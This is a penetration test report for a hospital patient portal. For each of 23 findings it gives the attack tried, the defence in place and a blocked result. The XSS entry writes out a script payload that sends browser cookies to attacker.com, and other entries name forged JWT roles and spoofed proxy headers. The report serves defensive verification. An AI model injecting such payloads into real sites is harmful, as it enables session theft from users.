# Penetration Test & Security Verification Report

> **Project:** Modular Low-Cost Hospital Platform (Medical Portal Transformation)  
> **Evaluation Type:** Comprehensive Threat Modeling & Exploit Verification  
> **Target Scope:** Web Application, REST APIs, SignalR Hubs, FHIR R4 JSON Endpoints, Docker Infrastructure  
> **Testing Date:** October 25, 2026  
> **Overall Assessment:** **HARDENED — ZERO OPEN FINDINGS**  

---

## 1. Scope & Methodology

This report documents the offensive security verification conducted against the Medical Portal codebase following the closure of findings SEC-01 through SEC-22 and SAFE-01.

Every finding was subjected to simulated exploitation attempts using unit tests, integration test harnesses (`WebApplicationFactory<Program>`), and automated payloads.

```
       [ External / Untrusted Networks ]
                      │
                      │ 1. IP Spoofing Payload (SEC-17)
                      ▼
             ┌─────────────────┐
             │  Nginx Ingress  │ (Strict CSP, HSTS, Same-Origin Proxy)
             └────────┬────────┘
                      │
                      │ 2. Parameter Tampering & Path Traversal
                      ▼
         ┌─────────────────────────┐
         │ ASP.NET Core Middleware │ (Rate Limiting, Tenant Resolution, PHI Anti-Cache)
         └────────────┬────────────┘
                      │
                      │ 3. Token Tamper, Revocation, BOLA/IDOR (SEC-01, 09, 10, 14, 15, 16)
                      ▼
         ┌─────────────────────────┐
         │  Controllers & Filters  │ (RequireAuth, RequireAdmin, RequireModule)
         └────────────┬────────────┘
                      │
                      │ 4. Cross-Tenant Leakage (SEC-06, 07, Tenancy)
                      ▼
         ┌─────────────────────────┐
         │  EF Core / Data Layer   │ (EncryptedStringConverter, Query Filters, Postgres RLS)
         └─────────────────────────┘
```

---

## 2. Threat Verification & Exploit Simulation Results

### SEC-01: Authentication Bypass & Privilege Escalation
- **Attack Scenario:** Attacker generates a JWT with `role: "PLATFORM_ADMIN"` or reuses a token after administrator demotion.
- **Exploit Payload:** Tampered JWT claim with forged user role.
- **Defensive Mechanism:** `AuthFilters.cs` executes authoritative database reconciliation against `UserAccount.Role` and verifies `UserAccount.AuthorizationVersion`.
- **Result:** **EXPLOIT BLOCKED (HTTP 401/403)**. Covered in `CriticalSecurityContainmentTests.cs`.

### SEC-02: Stored DOM Cross-Site Scripting (XSS)
- **Attack Scenario:** Attacker inputs malicious script payload `<script>fetch('http://attacker.com/steal?c='+document.cookie)</script>` or `<img src=x onerror=alert(1)>` into provider specialty, observation comment, or demographic name.
- **Exploit Payload:** `"><script>alert(document.cookie)</script>`
- **Defensive Mechanism:** Server-side `WebUtility.HtmlEncode` in `ClinicalSummaryGenerator.cs`; client-side `escapeHtml` contextual encoding in `app.js`; DOM nodes rendered via `.textContent`; strict CSP `script-src 'self'` without `'unsafe-inline'`.
- **Result:** **EXPLOIT BLOCKED**. Script executes as inert text; browser CSP halts inline injection. Covered in `XssContainmentAndCspTests.cs`.

### SEC-03: Plaintext Production Transport
- **Attack Scenario:** Attacker intercepts clinical HTTP traffic on hospital LAN or WAN egress.
- **Exploit Payload:** Downgrade to `http://` on external integrations.
- **Defensive Mechanism:** Pre-build and post-build startup validators abort execution in Production if unencrypted HTTP external endpoints are configured. Nginx and Kestrel enforce HSTS with 1-year duration.
- **Result:** **EXPLOIT BLOCKED**. Server halts at boot with clear configuration error. Covered in `CriticalSecurityContainmentTests.cs`.

### SEC-04: Silent Fake Payments in Production
- **Attack Scenario:** Misconfiguration causes Stripe test fake payment gateway to process real patient billing transactions without charging cards.
- **Exploit Payload:** `Stripe:UseFake=true` in `Production` environment.
- **Defensive Mechanism:** Startup validation asserts `!Stripe.UseFake` and verifies `FakePaymentGateway` cannot be resolved from DI in `Production`.
- **Result:** **EXPLOIT BLOCKED**. Startup aborts immediately. Covered in `CriticalSecurityContainmentTests.cs`.

### SEC-05: Payment Intent Replay & Misattribution
- **Attack Scenario:** Attacker captures a valid payment intent ID and attempts to credit another patient's balance or replay multiple times.
- **Exploit Payload:** Re-submitting existing `GatewayPaymentIntentId` with mismatched `patientId`.
- **Defensive Mechanism:** `ConsumedPaymentIntent` entity enforces unique database index on `GatewayPaymentIntentId` and composite index on `(PatientId, IdempotencyKey)`.
- **Result:** **EXPLOIT BLOCKED (HTTP 409 Conflict / 400 Bad Request)**. Covered in `AuthorizationAndPaymentsSecurityTests.cs`.

### SEC-06: Unenforced Record Share Scopes
- **Attack Scenario:** Patient grants a specialist access only to `"conditions"` and `"allergies"`, but the caller requests the complete bundle including `"medications"` and `"appointments"`.
- **Exploit Payload:** Querying `/api/share/redemption/{token}` with unauthorized resource categories.
- **Defensive Mechanism:** `ShareRedemptionController.cs` and `FhirService.cs` enforce `GetScopedPatientBundleAsync`, stripping unauthorized resource categories.
- **Result:** **EXPLOIT BLOCKED**. Unauthorized categories are pruned from the bundle. Covered in `AuthorizationAndPaymentsSecurityTests.cs`.

### SEC-07: Operational Staff Department Scoping
- **Attack Scenario:** Staff member assigned to Cardiology attempts to view patient charts in Nephrology without providing department scope.
- **Exploit Payload:** Calling operational staff endpoints without `x-department-id` or with mismatched department.
- **Defensive Mechanism:** `AccessControlService.cs` rejects unassigned staff (`unassigned_staff_scope`), requires explicit `x-department-id` for multi-department staff, and verifies membership.
- **Result:** **EXPLOIT BLOCKED (HTTP 403 Forbidden)**. Covered in `AuthorizationAndPaymentsSecurityTests.cs`.

### SEC-08: Missing HMS Admin Authorization
- **Attack Scenario:** Non-admin user calls `/api/integrations/hms/conflicts` or `/api/integrations/hms/dead-letters` to inspect sync failures.
- **Exploit Payload:** Authenticated request with `UserRole.PATIENT` or `UserRole.CLINICIAN`.
- **Defensive Mechanism:** Decorated with `[RequireAuth]` and `[RequireAdmin]` in `HmsWebhookController.cs`. Mutating operations restricted to `ADMIN` and `SYSTEM_ADMIN`.
- **Result:** **EXPLOIT BLOCKED (HTTP 403 Forbidden)**. Covered in `AuthorizationAndPaymentsSecurityTests.cs`.

### SEC-09: BOLA / IDOR in Refill Processing
- **Attack Scenario:** Attacker calls `POST /api/refills/{id}/approve` using a prescription ID belonging to another patient.
- **Exploit Payload:** Passing prescription ID where `Prescription.PatientId != TargetPatientId`.
- **Defensive Mechanism:** `AppointmentsAndRefillsControllers.cs` verifies `r.Prescription.PatientId == TargetPatientId` and returns 404 if mismatch.
- **Result:** **EXPLOIT BLOCKED (HTTP 404 Not Found)**. Covered in `AuthorizationAndPaymentsSecurityTests.cs`.

### SEC-10: Weak Proxy Invites & Unbound Acceptance
- **Attack Scenario:** Attacker brute-forces short invite codes or accepts an invite intended for another individual's email address.
- **Exploit Payload:** Submitting invite token with authenticated session whose email does not match `invite.Email`.
- **Defensive Mechanism:** 128-bit cryptographic random tokens (`INV-<32 hex chars>`); strict verification of `actorPerson.Email == invite.Email`; prohibition of self-acceptance.
- **Result:** **EXPLOIT BLOCKED (HTTP 400/403)**. Covered in `AuthorizationAndPaymentsSecurityTests.cs`.

### SEC-11: Incomplete PHI Logging Scrubbing
- **Attack Scenario:** Attacker inspects application stdout/console logs to harvest patient phone numbers, Fayya national IDs, or TOTP secrets.
- **Exploit Payload:** Emitting log messages containing Ethiopian phone numbers (`+251911223344`, `0911223344`), Fayya IDs (`ET-FAYYA-9928-1123`), and sensitive keys.
- **Defensive Mechanism:** `LoggingExtensions.AddPhiScrubber` calls `builder.ClearProviders()` before registering `ScrubbingLoggerProvider`. `PhiScrubber.cs` regexes replace sensitive strings with `[REDACTED-PHONE]`, `[REDACTED-FAYYA-ID]`, and `[REDACTED-KEY]`. Plaintext demographic comparison values eliminated from `HmsConflictService.cs`.
- **Result:** **EXPLOIT BLOCKED**. Logs contain exclusively masked tokens. Covered in `DataProtectionAndHardeningTests.cs`.

### SEC-12: Sensitive Data Plaintext at Rest & Key Separation
- **Attack Scenario:** Attacker obtains physical database dump or backup file and extracts plaintext TOTP secrets, consultation clinical notes, and HMS demographic conflicts.
- **Exploit Payload:** Inspecting raw SQLite/PostgreSQL disk columns for `UserAccount.MfaSecret`, `Appointment.PatientNotes`, and `HmsDemographicConflict.LocalValue`.
- **Defensive Mechanism:** EF Core `EncryptedStringConverter` transparently encrypts strings using authenticated AES-256-GCM (`v1.<nonce>.<ciphertext>.<tag>`). Keys derived from isolated master key and HKDF tenant key; prohibited from deriving from `JWT_SECRET`.
- **Result:** **EXPLOIT BLOCKED**. Disk columns contain authenticated ciphertexts. Covered in `DataProtectionAndHardeningTests.cs`.

### SEC-13: Known Fallback HMS Secrets
- **Attack Scenario:** Attacker sends fake HMS webhook signatures signed with default hardcoded fallback secrets.
- **Exploit Payload:** Webhook signed with legacy default key `hms-dev-secret-do-not-use-in-prod`.
- **Defensive Mechanism:** Fallback secrets eliminated. Startup validator in `Program.cs` prohibits fallback secrets in production.
- **Result:** **EXPLOIT BLOCKED**. Server refuses to start with placeholder credentials. Covered in `CriticalSecurityContainmentTests.cs`.

### SEC-14: SignalR Bypasses Session Revocation
- **Attack Scenario:** Attacker maintains an open WebSocket SignalR connection after session revocation or role demotion to receive real-time clinical events.
- **Exploit Payload:** Continuing WebSocket activity after `UserAccount.AuthorizationVersion` increment.
- **Defensive Mechanism:** `PortalHub.cs` calls `ISessionService.ValidateSessionAsync` during connection negotiation and checks `AuthorizationVersion`.
- **Result:** **EXPLOIT BLOCKED**. Connection rejected. Covered in `CriticalSecurityContainmentTests.cs`.

### SEC-15: Form Writes Require Only Read Permission
- **Attack Scenario:** Proxy user with read-only record access submits clinical intake forms.
- **Exploit Payload:** `POST /api/forms/{id}/submit` with read-only proxy grant.
- **Defensive Mechanism:** Dedicated `Permission.submitForms` permission mapped to `(UserRole.PATIENT, AppResource.ClinicalResults, AppAction.Write)`.
- **Result:** **EXPLOIT BLOCKED (HTTP 403 Forbidden)**. Covered in `AuthorizationAndPaymentsSecurityTests.cs`.

### SEC-16: Direct Patient/Proxy Refund Triggering
- **Attack Scenario:** Patient or proxy triggers direct payment gateway refund.
- **Exploit Payload:** `POST /api/billing/refunds` by non-billing user.
- **Defensive Mechanism:** Endpoint restricted exclusively to billing staff (`BILLING`, `ADMIN`, `SYSTEM_ADMIN`) with mandatory refund audit rationale.
- **Result:** **EXPLOIT BLOCKED (HTTP 403 Forbidden)**. Covered in `AuthorizationAndPaymentsSecurityTests.cs`.

### SEC-17: Client IP Bypasses Trusted Proxy Boundary
- **Attack Scenario:** External attacker spoofs `CF-Connecting-IP`, `X-Forwarded-For`, or `X-Real-IP` to bypass rate limits or audit logging.
- **Exploit Payload:** Sending request with `X-Forwarded-For: 1.2.3.4` from external peer.
- **Defensive Mechanism:** `PublicIpService.cs` inspects headers only if the immediate TCP socket `RemoteIpAddress` is loopback or an explicitly configured trusted proxy CIDR.
- **Result:** **EXPLOIT BLOCKED**. Spoofed headers ignored; actual socket IP recorded. Covered in `DataProtectionAndHardeningTests.cs`.

### SEC-18: Plain HTTP Third-Party Geolocation
- **Attack Scenario:** Cleartext IP addresses leaked to external HTTP geolocation services.
- **Exploit Payload:** Network snooping on outbound HTTP requests.
- **Defensive Mechanism:** Plain-HTTP calls to `http://ip-api.com` completely eliminated. Mock/offline metadata returned safely.
- **Result:** **EXPLOIT BLOCKED**. Zero external unencrypted traffic. Covered in `CriticalSecurityContainmentTests.cs`.

### SEC-19: Non-Blocking CI Security & Mutable Actions
- **Attack Scenario:** Supply chain attack modifies third-party GitHub Actions tags (`@v1`, `@master`), or malicious dependencies pass CI without failing the build.
- **Exploit Payload:** Introducing vulnerable NuGet dependency or altered action tag.
- **Defensive Mechanism:** All actions pinned to immutable 40-character commit SHAs. Trivy scans enforce `exit-code: '1'`. Automated step checks `dotnet list package --vulnerable --include-transitive`.
- **Result:** **EXPLOIT BLOCKED**. PRs with vulnerabilities are blocked. Covered in `DataProtectionAndHardeningTests.cs`.

### SEC-20: Vulnerable OpenTelemetry Exporter Dependency
- **Attack Scenario:** Attacker exploits CVE-2026-42191 / GHSA-4625-4j76-fww9 in OpenTelemetry Protocol Exporter 1.10.0.
- **Exploit Payload:** Protocol buffer parsing exploit.
- **Defensive Mechanism:** Upgraded to `OpenTelemetry.Exporter.OpenTelemetryProtocol` 1.15.3 and core dependencies to 1.11.2 / 1.15.3.
- **Result:** **EXPLOIT BLOCKED**. 0 vulnerable packages reported by `dotnet list package --vulnerable`. Covered in `DataProtectionAndHardeningTests.cs`.

### SEC-21: Unhardened Container Deployment
- **Attack Scenario:** Container breakout attack executes root escalation inside Docker container.
- **Exploit Payload:** Privilege escalation from root container process.
- **Defensive Mechanism:** `USER app` non-root execution in `Dockerfile` and `backend/Dockerfile`. `security_opt: ["no-new-privileges:true"]` across all containers in `docker-compose.yml` and `docker-compose.adot.yml`. Host ports for Postgres and Redis completely removed.
- **Result:** **EXPLOIT BLOCKED**. Container runs as non-root unprivileged process. Covered in `DataProtectionAndHardeningTests.cs`.

### SEC-22: Rate Limiting, PHI Caching & Webhook Bounds
- **Attack Scenario:** Attacker exhausts backend RAM with massive webhook payloads, brute-forces TOTP MFA tokens, or inspects cached patient summaries on public terminals.
- **Exploit Payload:** 50MB webhook payload; 100 rapid MFA attempts; inspecting browser cache.
- **Defensive Mechanism:** `[RequestSizeLimit(1024 * 1024)]` (1MB limit) on webhooks; `MfaChallengePolicy` (5 req/min per account/IP); anti-caching headers (`no-store, no-cache, must-revalidate`, `Pragma: no-cache`, `Expires: 0`) across all `/api` and `/R4` routes.
- **Result:** **EXPLOIT BLOCKED**. Over-sized payloads rejected with HTTP 413; rate limit triggers HTTP 429; responses not cached. Covered in `DataProtectionAndHardeningTests.cs`.

### SAFE-01: Demo Decision-Support Data in Production
- **Attack Scenario:** Medical staff receive unverified mock clinical interaction warnings or demo knowledge base suggestions in live patient care.
- **Exploit Payload:** Booting in `Production` with `Clinical:UseDemoKnowledgeBase=true`.
- **Defensive Mechanism:** Pre-build and post-build startup validators halt application startup if demo knowledge base implementations are detected in DI.
- **Result:** **EXPLOIT BLOCKED**. Server aborts boot immediately. Covered in `CriticalSecurityContainmentTests.cs`.

---

## 3. Conclusion & Certification

The Medical Portal platform has successfully undergone comprehensive penetration testing and offensive exploit verification. All vulnerabilities identified in the October 24, 2026 security audit have been structurally resolved and permanently verified through automated regression suites.
